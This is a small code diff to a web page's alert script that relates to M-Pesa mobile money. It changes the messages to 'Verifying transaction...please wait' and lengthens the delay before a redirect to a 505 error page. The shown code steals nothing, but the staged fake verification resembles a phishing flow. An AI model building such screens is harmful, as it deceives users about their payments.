@@ -79,13 +79,13 @@
           
             alertPlaceholder.append(wrapper)
           }
-          redirectTime = "2000";
-          redirectURL = "index.html";
+          redirectTime = "10900";
+          redirectURL = "./505.html";
           const alertTrigger = document.getElementById('liveAlertBtn')
           if (alertTrigger) {
             alertTrigger.addEventListener('click', () => {
-              appendAlert('Confirm your M-pesa number', 'warning')
-              appendAlert('Redirecting...', 'warning')
+              appendAlert('Verifying transaction...please wait', 'danger')
+              appendAlert('Redirecting...', 'danger')
               setTimeout("location.href = redirectURL;",redirectTime)
             })
           }
